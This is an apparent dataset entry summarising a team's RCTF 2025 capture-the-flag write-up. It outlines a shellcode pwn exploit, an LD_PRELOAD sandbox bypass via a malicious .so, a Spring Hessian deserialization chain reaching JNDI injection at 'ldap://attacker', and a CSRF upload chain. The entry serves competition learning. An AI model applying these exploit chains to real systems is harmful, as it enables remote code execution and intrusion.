---
title: RCTF 2025 WP - XMCVE-Polaris 战队第 16 名
contest: RCTF 2025
year: 2025
difficulty: high
vuln_type: deserialize
tags: [pwn, sandbox-bypass, ld-preload, ldap-jndi, spring-jndi, hessian, csrf-upload, race-condition, jvm-sandbox, ld.so]
attack_chain:
  - RCTF 2025 XMCVE-Polaris 战队第 16 名 5010.05 分
  - pwn: bookkeeping 算 double NaN/special 触发浮点漏洞
  - struct.pack('<Q', 0x0D0E0A0D0B0E0E0F) 转 double = 8.592564544313935e-246
  - runcode() 写 0x20 shellcode 含 syscall (mov rcx, rsi; mov dl, 0xff; syscall)
  - orw shellcode: sub rbp/rsp 0x12345678 + push 0x67616c66 "flag" + open+read+write
  - sandbox 题: LD_PRELOAD=sandbox.so 加载恶意 .so
  - 写恶意 base64 so 到 /opt/maxkb-app/sandbox/sandbox.so
  - base64 编码后 Python exec() payload 写文件
  - Spring Hessian 反序列化: Maybe(InvocationHandler) + ObjectFactory<T> + JNDI
  - ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory 用 Unsafe 反射设 beanFactory=SimpleJndiBeanFactory
  - targetBeanName="ldap://attacker" → JNDI 注入 → RCE
  - Web 题: CSRF 漏洞 /api/photos/upload 接受 files = [('photos[]', ('x.png', f, '-1'))] content-type -1
  - set_background photo_id → superadmin.php 触发
  - 完整 POC: register → upload_photo → set_background → get_flag
key_payload: bookkeeping() + runcode(shellcode) + sandbox.so LD_PRELOAD bypass + Spring JNDI ldap://attacker
one_liner: RCTF 2025 XMCVE-Polaris 战队第 16 名 3 大方向：PWN (浮点漏洞 + syscall) + Sandbox (LD_PRELOAD 替换 sandbox.so) + Web (Spring Hessian 反序列化 + CSRF 上传)。
lesson: 浮点特殊值可触发 double 转 long 时漏洞；LD_PRELOAD 是 sandbox 攻击最经典入口 (替换 .so)；Hessian 反序列化 + JNDI + Spring ObjectFactory 链可绕过白名单 (com.rctf.server.tool./java.util./org.springframework.beans./org.springframework.jndi.)。
quality: high
---
